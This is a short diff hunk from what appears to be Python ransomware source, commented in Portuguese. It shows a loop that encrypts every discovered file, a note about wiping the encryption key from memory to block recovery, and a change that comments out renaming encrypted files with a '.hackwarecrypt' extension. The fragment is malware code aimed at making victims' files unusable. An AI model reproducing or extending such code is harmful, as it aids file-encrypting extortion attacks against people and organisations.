@@ -70,10 +70,10 @@ def main():
         for filename in discovered_files:
             Crypter.change_files(filename, cryptFn)
             # Renomeia o arquivo pra indicar a encriptação
-            if not decrypt:
-                os.rename(filename, filename+'.hackwarecrypt')
-            else:
-                os.rename(filename, filename.replace('.hackwarecrypt', ''))
+            # if not decrypt:
+            #     os.rename(filename, filename+'.hackwarecrypt')
+            # else:
+            #     os.rename(filename, filename.replace('.hackwarecrypt', ''))
 
     # Limpa a chave de encriptação da Memória
     # para evitar a recuperação através de ferramentas
